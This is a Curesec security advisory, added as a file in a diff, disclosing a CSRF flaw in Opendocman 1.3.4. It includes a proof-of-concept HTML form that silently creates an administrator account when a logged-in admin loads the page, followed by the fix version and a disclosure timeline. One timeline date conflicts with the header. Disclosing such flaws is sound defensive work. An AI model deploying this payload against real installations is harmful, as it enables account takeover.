@@ -1,0 +1,82 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:    Opendocman 1.3.4
+Fixed in:            1.3.5
+Fixed Version Link:  http://www.opendocman.com/free-download/
+Vendor Website:      http://www.opendocman.com/
+Vulnerability Type:  CSRF
+Remote Exploitable:  Yes
+Reported to vendor:  11/21/2015
+Disclosed to public: 02/01/2016
+Release mode:        Coordinated Release
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. Overview
+
+CVSS
+
+Medium 5.1 AV:N/AC:H/Au:N/C:P/I:P/A:P
+
+Description
+
+Opendocman does not have CSRF protection, which means that an attacker can
+perform actions for an admin, if the admin visits an attacker controlled
+website while logged in.
+
+3. Proof of Concept
+
+Add new Admin User:
+
+    <html>
+      <body>
+        <form action="http://localhost/opendocman-1.3.4/user.php" method="POST" enctype="multipart/form-data">
+          <input type="hidden" name="last&#95;name" value="test" />
+          <input type="hidden" name="first&#95;name" value="test" />
+          <input type="hidden" name="username" value="test" />
+          <input type="hidden" name="phonenumber" value="1214532" />
+          <input type="hidden" name="password" value="12345678" />
+          <input type="hidden" name="Email" value="test&#64;example&#46;com" />
+          <input type="hidden" name="department" value="1" />
+          <input type="hidden" name="admin" value="1" />
+          <input type="hidden" name="can&#95;add" value="1" />
+          <input type="hidden" name="can&#95;checkin" value="1" />
+          <input type="hidden" name="submit" value="Add&#32;User" />
+          <input type="submit" value="Submit request" />
+        </form>
+      </body>
+    </html>
+
+
+4. Solution
+
+To mitigate this issue please upgrade at least to version 1.3.5:
+
+http://www.opendocman.com/free-download/
+
+Please note that a newer version might already be available.
+
+5. Report Timeline
+
+11/21/2015 Informed Vendor about Issue (no reply)
+12/10/2015 Reminded Vendor of disclosure date
+12/19/2015 Vendor sends fix for CSRF for verification
+01/13/2016 Confirmed CSRF fix
+01/20/2016 Vendor requests more time to fix other issues in same version
+01/31/2016 Vendor releases fix
+02/01/2015 Disclosed to public
+
+
+Blog Reference:
+https://blog.curesec.com/article/blog/Opendocman-134-CSRF-150.html
+ 
+--
+blog:  https://blog.curesec.com
+tweet: https://twitter.com/curesec
+
+Curesec GmbH
+Curesec Research Team
+Romain-Rolland-Str 14-24
+13089 Berlin, Germany
